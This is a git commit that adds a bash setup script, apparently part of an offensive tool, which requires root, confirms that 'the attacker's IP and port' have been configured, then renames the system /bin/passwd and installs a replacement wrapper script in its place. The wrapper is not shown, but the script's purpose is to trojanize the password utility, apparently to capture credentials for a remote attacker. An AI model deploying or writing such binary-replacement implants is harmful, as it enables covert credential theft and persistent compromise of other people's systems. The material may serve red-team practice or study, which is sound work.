32002ea09eb358b1b5ff60905ab400262560d71f
FletcherMeyer <53588444+FletcherMeyer@users.noreply.github.com>
2025-10-21 22:25:16 -0500

    Add setup script for modifying passwd behavior

---
+++ setup.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  echo "You are not root. Please run this script as root."
+  exit 1
+fi
+
+read -p "Has the attacker's IP and port been modified in './passwd_replace'? (yes/no): " response 
+
+case $response in
+    [yY][eE][sS] )
+        echo "Proceeding..."
+        ;;
+    [nN][oO] )
+        echo "Exiting..."
+        exit 0
+        ;;
+    * )
+        echo "Invalid input. Please enter yes or no."
+        exit 1
+    ;;
+esac
+
+echo "Moving original passwd..."
+mv /bin/passwd /bin/nut_passwd
+
+echo "Creating wrapper for nutty passwd..."
+cp ./passwd_replace.sh /bin/passwd
+chmod 755 /bin/passwd 
+
+echo "Finished!"
+exit 0
